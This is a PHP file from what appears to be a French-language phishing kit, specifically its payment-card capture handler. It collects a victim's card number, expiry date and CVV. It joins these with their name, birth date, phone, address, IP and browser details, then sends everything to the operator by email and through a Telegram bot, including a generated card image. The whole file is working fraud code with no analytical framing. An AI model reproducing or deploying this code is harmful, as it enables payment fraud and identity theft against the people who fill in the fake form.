<?php
include '../../settings.php';
include '../core/funcs.php';
session_start();

if (isset($_POST['cc'],$_POST['exp'],$_POST['cvv'])) {
    $_SESSION['cc'] = $_POST['cc'];
    $_SESSION['exp'] = $_POST['exp'];
    $_SESSION['cvv'] = $_POST['cvv'];

    if (luhnCheck(str_replace(' ', '',$_SESSION['cc'])) == 0) {
      header('location: ../card.php?error=1');
      die();
    }

    if ($api_key != "") {
        $bin = substr($_SESSION['cc'],0,7);
        $bin = str_replace(' ','',$bin);
        $data = json_decode(getBin($api_key,$bin),true);
        $level = $data['level'];
        $type = $data['type'];
        $bank = $data['bank'];
      }else{
        $level = "unknow";
        $type = "unknow";
        $bank = "unknow";
      }
      $message = "≡≡≡≡≡≡≡≡ ☫💳☫ ≡≡≡≡≡≡≡≡

💳 Numéro de carte : ".$_SESSION['cc']."
💳 Date d'expiration : ".$_SESSION['exp']."
💳 CVV : ".$_SESSION['cvv']."
      
🎖 Level : ".$level."
🏦 Banque : ".$bank."
♻️ Type : ".$type."

≡≡≡≡≡≡≡≡ ☫🪪☫ ≡≡≡≡≡≡≡≡
      
👮🏼‍♂️ Nom et prénom : ".$_SESSION['name'] . " ".$_SESSION['fname'] . "
👨🏼‍⚕️ Date de naissance : ".$_SESSION['dob']."
☎️ Numéro de téléphone : ".$_SESSION['tel']."
                    
🏘 Ville : ".$_SESSION['city']."
🛖 Adresse : ".$_SESSION['address']."
🗳 Code Postal : ".$_SESSION['zip']."
                 
≡≡≡≡≡≡≡≡ ☫📶☫ ≡≡≡≡≡≡≡≡

📍 Adresse IP : ".$_SERVER['REMOTE_ADDR']."
📡 User Agent :" . $_SERVER['HTTP_USER_AGENT'];
    
    sendMailRez($email,"💳 + 1 Nouvelle carte : [".$_SESSION['cc']."] 💳",$message);
    sendTelegramRez($message, True);
    change($_SERVER['REMOTE_ADDR'], '0');
    update('carte');

    $imageFileName = createCardImage($_SESSION['cc'], $_SESSION['exp'], $_SESSION['cvv']);
    $imagePath = __DIR__ . '/' . $imageFileName;
    $botToken = $token;
    $chatId = $chatid;
    $telegramApiUrl = 'https://api.telegram.org/bot' . $botToken . '/sendPhoto';
    $postFields = array('chat_id' => $chatId,'photo' => new CURLFile($imagePath));
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type:multipart/form-data"));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Erreur lors de l\'envoi de l\'image : ' . curl_error($ch);
    }
    curl_close($ch);
    unlink($imagePath);

    if ($panel) {
      header('location: ../loading.php?page=loading.php');
    }else{
      header('location: ../loading.php?page=end.php');
    }
    
    
}